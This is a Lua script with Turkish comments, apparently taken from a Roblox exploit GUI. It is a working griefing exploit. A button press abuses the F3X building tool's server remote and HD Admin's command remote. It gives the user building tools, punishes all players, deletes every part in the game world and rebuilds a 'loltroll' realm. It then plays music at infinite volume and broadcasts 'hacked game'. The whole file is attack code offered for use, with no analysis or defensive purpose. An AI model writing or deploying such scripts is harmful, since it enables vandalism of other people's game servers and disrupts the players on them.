local function C_36()
	local script = LMG2L["LocalScript_36"];
	local button = script.Parent

	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	local player = game.Players.LocalPlayer



	--- ====== F3X VE ADMİN BULUCU ====== ---

	local function getF3X()

	    local char = player.Character or player.CharacterAdded:Wait()

	    local backpack = player.Backpack

	    for _, v in ipairs(backpack:GetChildren()) do

	        if v:FindFirstChild("SyncAPI") then return v end

	    end

	    for _, v in ipairs(char:GetChildren()) do

	        if v:FindFirstChild("SyncAPI") then return v end

	    end

	    return nil

	end



	local function getHDAdmin()

	    return ReplicatedStorage:WaitForChild("HDAdminHDClient", 5) and ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent

	end



	--- ====== ANA İŞLEM FONKSİYONU ====== ---

	local function executeRealm()

	    local RequestCommand = getHDAdmin()

	    local f3x = getF3X()



	    if not f3x then warn("F3X bulunamadı!") return end

	    local serverendpoint = f3x.SyncAPI.ServerEndpoint



	    -- Yardımcı F3X Fonksiyonları

	    local function invoke(args) serverendpoint:InvokeServer(unpack(args)) end

	    local function delete(part) invoke({"Remove", {part}}) end

	    local function resize(part,size,cf) invoke({"SyncResize", {{["Part"] = part, ["CFrame"] = cf, ["Size"] = size}}}) end

	    local function syncmaterial(part,mate) invoke({"SyncMaterial", {{["Part"] = part, ["Material"] = mate}}}) end

	    local function transparency(part,trans) invoke({"SyncMaterial", {{["Part"] = part, ["Transparency"] = trans}}}) end

	    local function color(part, col) invoke({"SyncColor", {{["Part"] = part, ["Color"] = col, ["UnionColoring"] = false}}}) end

	    local function syncmeshid(part, id) invoke({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://"..id}}}) end

	    local function makemesh(part) invoke({"CreateMeshes", {{["Part"] = part}}}) end

	    local function syncmeshsize(part, vec) invoke({"SyncMesh", {{["Part"] = part, ["Scale"] = vec}}}) end

	    local function syncmeshtexture(part, id) invoke({"SyncMesh", {{["Part"] = part, ["TextureId"] ="rbxassetid://"..id}}}) end

	    local function name(part, str) invoke({"SetName", {part}, str}) end

	    local function lock(part, bool) invoke({"SetLocked", {part}, bool}) end

	    local function setcollision(part, bool) invoke({"SyncCollision", {{["Part"] = part, ["CanCollide"] = bool}}}) end

	    local function setanchor(part, bool) invoke({"SyncAnchor", {{["Part"] = part, ["Anchored"] = bool}}}) end

	    local function createdecal(part, side) invoke({"CreateTextures", {{["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal"}}}) end

	    local function setdecal(part, asset, side) invoke({"SyncTexture", {{["Part"] = part, ["Face"] = side, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://".. asset}}}) end



	    -- 1. ADIM: Admin Komutları (Btools al ve herkesi cezalandır)

	    if RequestCommand then

	        RequestCommand:InvokeServer(";btools me")

	        task.wait(0.4)

	        RequestCommand:InvokeServer(";punish all")

	    end



	    -- 2. ADIM: Her Şeyi Sil (Delete All)

	    for _, v in ipairs(workspace:GetDescendants()) do

	        if v:IsA("BasePart") or v:IsA("UnionOperation") then

	            task.spawn(function() delete(v) end)

	        end

	    end

	    task.wait(0.5)



	    -- 3. ADIM: Yeni Dünyayı Kur (Realm)

	    local function setupRealm()

	        -- Zemin Oluşturma

	        local basePos = CFrame.new(0, 5, 0)

	        local base = serverendpoint:InvokeServer("CreatePart", "Normal", basePos, workspace)

	        resize(base, Vector3.new(512, 16, 512), basePos)

	        syncmaterial(base, Enum.Material.Concrete)

	        color(base, Color3.new(0.5, 0.5, 0.5))

	        name(base, "loltroll")

	        lock(base, true)



	        -- Spawn Noktası

	        local spawnPos = CFrame.new(34.5, 8.1, -26)

	        local spawna = serverendpoint:InvokeServer("CreatePart", "Spawn", spawnPos, workspace)

	        resize(spawna, Vector3.new(20, 10, 20), spawnPos)

	        createdecal(spawna, Enum.NormalId.Top)

	        setdecal(spawna, "93541276656484", Enum.NormalId.Top)

	        transparency(spawna, 1)



	        -- Gökyüzü (Sky Mesh)

	        local sky = serverendpoint:InvokeServer("CreatePart", "Normal", basePos, workspace)

	        makemesh(sky)

	        syncmeshtexture(sky, "93541276656484")

	        syncmeshsize(sky, Vector3.new(20000, 20000, 20000))

	        name(sky, "Sky")

	        setcollision(sky, false)

	    end



	    setupRealm()



	    -- 4. ADIM: Final Admin Komutları (Müzik ve Görsel Efektler)

	    if RequestCommand then

	        RequestCommand:InvokeServer(";res all")

	        task.wait(0.3)

	        RequestCommand:InvokeServer(";r6 all")

	        RequestCommand:InvokeServer(";time 14")

	        RequestCommand:InvokeServer(";music 135125762857428 ;volume inf ;pitch 0.2 ;sm wdaf hacked game")

	    end

	end



	--- ====== BUTON BAĞLANTISI ====== ---

	button.MouseButton1Click:Connect(function()

	    executeRealm()

	end)	
end;
task.spawn(C_36);
